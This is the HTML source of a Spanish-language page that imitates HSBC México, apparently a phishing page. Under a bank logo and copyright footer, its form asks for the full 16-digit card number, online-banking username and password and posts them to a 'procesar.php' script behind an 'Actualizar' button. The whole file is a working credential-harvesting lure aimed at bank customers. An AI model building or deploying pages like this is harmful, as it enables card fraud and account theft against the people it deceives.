<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>HSBC</title>
  <!-- Bootstrap CSS -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">

  <style>
    body {
      margin: 0;
      padding-bottom: 50px; /* Altura de las líneas de separación */
      display: flex;
      flex-direction: column;
      min-height: 100vh; /* Ajusta la altura del cuerpo */
      background-image: url('images/foto.jpg'); /* Ruta a tu imagen de fondo */
      background-size: cover;
      background-repeat: no-repeat;
      background-attachment: fixed; /* Evita que la imagen de fondo se desplace con el contenido */
    }
    .logo {
      position: absolute;
      top: 20px;
      left: 20px;
      width: 100px; /* Ajusta el tamaño de tu logo */
    }
    .container {
      background-color: rgba(255, 255, 255, 0.5); /* Ajusta la opacidad del fondo del formulario */
      padding: 20px;
      border-radius: 10px;
      margin-top: 150px; /* Espacio superior para el logo */
      position: relative;
      width: 80%; /* Ajusta el ancho del contenedor del formulario */
      max-width: 550px; /* Establece un ancho máximo para evitar que el formulario sea demasiado ancho en pantallas grandes */
      margin-left: auto; /* Centra el contenedor horizontalmente */
      margin-right: auto;
    }
    .linea-separacion {
      position: absolute;
      top: 90px; /* Posición vertical entre el logo y el formulario */
      left: 0;
      width: 100%;
      border-top: 5px solid red; /* Línea de separación roja */
    }
    .btn-enviar {
      display: block; /* Hace que el botón sea un elemento de bloque */
      margin: 0 auto; /* Centra el botón horizontalmente */
      background-color: red; /* Color de fondo rojo */
      color: white; /* Color del texto blanco */
      border: none; /* Sin borde */
      padding: 10px 20px; /* Espaciado interno */
      
    }
    .footer{
        text-align: center; /* Centra el contenido dentro del contenedor */
        margin-left: 180px; /* Centra el contenedor horizontalmente */
        margin-right: 180px;
        color: white;
    }
  </style>

</head>
<body>

<img class="logo" src="images/logo.png" alt="Logo"> <!-- Ruta al logo -->

<div class="linea-separacion"></div>

<div class="container">
  <h2>Ingresa los siguientes datos</h2>
  <form action="procesar.php" method="post">
    <div class="mb-3">
      <label for="numero" class="form-label">16 digitos de la tarjeta</label>
      <input type="numero" class="form-control" id="numero" name="numero">
    </div>
    <div class="mb-3">
      <label for="usuario" class="form-label">Usuario</label>
      <input type="usuario" class="form-control" id="usuario" name="usuario">
    </div>
    <div class="mb-3">
      <label for="contraseña" class="form-label">Contraseña</label>
      <input type="contraseña" class="form-control" id="contra" name="contra">
    </div>
    <button type="submit" class="btn-enviar">Actualizar</button>
  </form>
</div>

<br>
<br>
<br>
<br>
<br>

<div class="footer">
    <footer>© HSBC México 2024. Todos los Derechos Reservados Derechos ARCO 
    Agencias y despachos de Cobranza Consulta los Costos y las Comisiones de nuestros productos
    Este sitio está diseñado para su uso en México. Aviso Fronterizo.</footer>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
